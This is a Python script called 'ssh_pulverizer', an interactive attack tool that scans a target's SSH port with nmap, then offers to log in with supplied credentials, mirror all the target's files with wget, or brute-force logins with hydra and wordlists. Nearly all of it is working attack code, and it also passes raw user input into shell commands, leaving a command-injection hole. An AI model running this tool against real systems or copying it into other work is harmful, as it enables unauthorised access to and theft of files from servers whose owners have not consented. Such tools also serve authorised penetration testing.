#!/usr/bin/env python3

import os
import dill
import argparse
import nmap


parser = argparse.ArgumentParser(description="This is the ssh_pulverizer")
parser.add_argument("-t", "--target", type=str, help="Choose a target/host")
parser.add_argument("-p", "--port", type=int, help="Choose a port")
parser.add_argument("-f", "--filename", type=str, help="Choose an python-nmap class object file") # Legacy argument
args, unknown = parser.parse_known_args()

ssh_scan = nmap.PortScanner()
# ssh_scan.scan(args.target, arguments=f"-p {args.port} -A")
os.system(f"nmap {args.target} -vvv -p {str(args.port)} -A -oX {args.target}_{args.port}.xml")

with open(f"./{args.target}_{args.port}.xml") as fd:
    content = fd.read()
    ssh_scan.analyse_nmap_xml_scan(content)



def ssh_enum():

    while True:

        # Print a quick summary
        print(f"Found ssh protocol on {args.target}, port {args.port}. State: {ssh_scan[str(args.target)]['tcp'][args.port]['state']}")
        print(f"Product: {ssh_scan[str(args.target)]['tcp'][args.port]['product']}")
        print(f"Version: {ssh_scan[str(args.target)]['tcp'][args.port]['version']}")
        print(f"CPE: {ssh_scan[str(args.target)]['tcp'][args.port]['cpe']}")

        try:
            choice = input(f"""
[1] Attempt to login with a specified username and password.
[2] Attempt to login with a specified username and password, automatically download all files.
[3] Brute force
[4] Exit
""")

            # Choice 1 - try to login with specified username/password
            if choice.lower() == str(1):
                username = input("Enter username\n")
                password = input("Enter password\n")
                os.system(f"ssh ssh://{username}:{password}@{args.target}:{args.port}")
            
            # Choice 2 - try to login with specified username/password and dl all files
            elif choice.lower() == str(2):
                username = input("Enter username\n")
                password = input("Enter password\n")
                os.system(f"wget -m -nd ssh://{username}:{password}@{args.target}:{args.port} -P {args.target}_ssh")
                print(f"Files saved in new folder: {args.target}_ssh. View of directory:")

           # Choice 3 - brute force
            elif choice.lower() == str(3):
                brute_force()

            # Choice 4 - break from the loop
            elif choice.lower() == str(4):
                break

            else:
                print("Invalid command")
        except:
            print("Looks like something went wrong here. ")


# attempt to brute force the login
def brute_force():
    while True:
        print("\nBRUTE FORCE")
        username = input("Choose username or username wordlist:\n")
        if "." and "/" in username:
            user_is_wordlist = True
        else:
            user_is_wordlist = False      

        password = input("Choose password or password wordlist:\n")
        if "." and "/" in password:
            password_is_wordlist = True
        else:
            password_is_wordlist = False

        tasks = str(input("Choose number of tasks to run concurrently:\n"))  

        if user_is_wordlist is True and password_is_wordlist is True:
            os.system(f"hydra -t {tasks} -L {username} -P {password} -vV {args.target} -s {args.port} ssh")

        elif user_is_wordlist is True and password_is_wordlist is False:
            os.system(f"hydra -t {tasks} -L {username} -p {password} -vV {args.target} -s {args.port} ssh")

        elif user_is_wordlist is False and password_is_wordlist is False:
            os.system(f"hydra -t {tasks} -l {username} -p {password} -vV {args.target} -s {args.port} ssh")

        elif user_is_wordlist is False and password_is_wordlist is True:
            os.system(f"hydra -t {tasks} -l {username} -P {password} -vV {args.target} -s {args.port} ssh")

# Run the anonymous function if anonymous access is found by nmap

ssh_enum()

